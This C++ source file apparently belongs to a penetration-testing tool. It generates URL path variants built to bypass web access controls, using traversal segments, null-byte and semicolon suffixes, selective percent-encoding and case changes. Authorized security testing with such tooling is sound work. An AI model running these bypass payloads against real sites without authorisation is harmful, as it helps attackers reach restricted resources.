#include "techniques/path_bypass.hpp"
#include "common/utils.hpp"

namespace byps {

PathBypass::PathBypass() {
}

std::vector<std::string> PathBypass::generateVariations(const std::string& path) {
    std::vector<std::string> all_variations;
    
    // Add trailing slash variations
    auto trailing = addTrailingSlash(path);
    all_variations.insert(all_variations.end(), trailing.begin(), trailing.end());
    
    // Add URL encoding variations
    auto encoded = urlEncodingVariations(path);
    all_variations.insert(all_variations.end(), encoded.begin(), encoded.end());
    
    // Add case variations
    auto cases = caseVariations(path);
    all_variations.insert(all_variations.end(), cases.begin(), cases.end());
    
    // Add path traversal
    auto traversal = pathTraversal(path);
    all_variations.insert(all_variations.end(), traversal.begin(), traversal.end());
    
    // Add null byte injection
    auto null_bytes = nullByteInjection(path);
    all_variations.insert(all_variations.end(), null_bytes.begin(), null_bytes.end());
    
    // Add dot segments
    auto dots = dotSegments(path);
    all_variations.insert(all_variations.end(), dots.begin(), dots.end());
    
    // Add semicolon bypass
    auto semicolons = semicolonBypass(path);
    all_variations.insert(all_variations.end(), semicolons.begin(), semicolons.end());
    
    // Add percent-encoded dots
    auto percent_dots = percentEncodedDots(path);
    all_variations.insert(all_variations.end(), percent_dots.begin(), percent_dots.end());
    
    return all_variations;
}

std::vector<std::string> PathBypass::addTrailingSlash(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path.back() != '/') {
        variations.push_back(path + '/');
        variations.push_back(path + "//");
        variations.push_back(path + "/.");
        variations.push_back(path + "/./");
    }
    
    if (path.length() > 1 && path.back() == '/') {
        variations.push_back(path.substr(0, path.length() - 1));
    }
    
    return variations;
}

std::vector<std::string> PathBypass::urlEncodingVariations(const std::string& path) {
    std::vector<std::string> variations;
    
    // Partial encoding - encode characters after the leading slash
    // Don't encode the leading slash to avoid hostname confusion
    if (!path.empty() && path.length() > 1) {
        std::string encoded_path;
        for (size_t i = 0; i < path.length(); ++i) {
            char c = path[i];
            // Keep leading slash, encode specific characters that might bypass filters
            if (i == 0 && c == '/') {
                encoded_path += c;
            } else if (c == 'e' || c == 'E') {
                encoded_path += (c == 'e') ? "%65" : "%45";  // 'e' or 'E'
            } else if (c == 'n' || c == 'N') {
                encoded_path += (c == 'n') ? "%6e" : "%4e";  // 'n' or 'N'
            } else if (c == 'v' || c == 'V') {
                encoded_path += (c == 'v') ? "%76" : "%56";  // 'v' or 'V'
            } else {
                encoded_path += c;
            }
        }
        if (encoded_path != path) {
            variations.push_back(encoded_path);
        }
    }
    
    return variations;
}

std::vector<std::string> PathBypass::caseVariations(const std::string& path) {
    return utils::generateCaseVariations(path);
}

std::vector<std::string> PathBypass::pathTraversal(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        variations.push_back("/." + path);
        variations.push_back("/./" + path.substr(1));
        variations.push_back("/./." + path);
        variations.push_back("/../" + path.substr(1));
        variations.push_back("/allowed/.." + path);
        variations.push_back("/public/.." + path);
        variations.push_back("/static/.." + path);
    }
    
    return variations;
}

std::vector<std::string> PathBypass::nullByteInjection(const std::string& path) {
    std::vector<std::string> variations;
    
    variations.push_back(path + "%00");
    variations.push_back(path + "%00.jpg");
    variations.push_back(path + "%00.php");
    variations.push_back(path + "%00.html");
    variations.push_back(path + std::string(1, '\0'));
    
    return variations;
}

std::vector<std::string> PathBypass::dotSegments(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        std::string base = path.substr(1);
        variations.push_back("/." + base);
        variations.push_back("/./" + base);
        variations.push_back("/././" + base);
        variations.push_back("/../" + base);
    }
    
    return variations;
}

std::vector<std::string> PathBypass::semicolonBypass(const std::string& path) {
    std::vector<std::string> variations;
    
    variations.push_back(path + ";");
    variations.push_back(path + ";/");
    variations.push_back(path + ";x");
    variations.push_back(path + ";.jpg");
    
    return variations;
}

std::vector<std::string> PathBypass::percentEncodedDots(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        std::string base = path.substr(1);
        variations.push_back("/%2e/" + base);
        variations.push_back("/%2e%2e/" + base);
        // Remove double-encoded variations as they often cause false positives
    }
    
    return variations;
}

bool PathBypass::isValidPath(const std::string& path) {
    return !path.empty() && path[0] == '/';
}

} // namespace byps
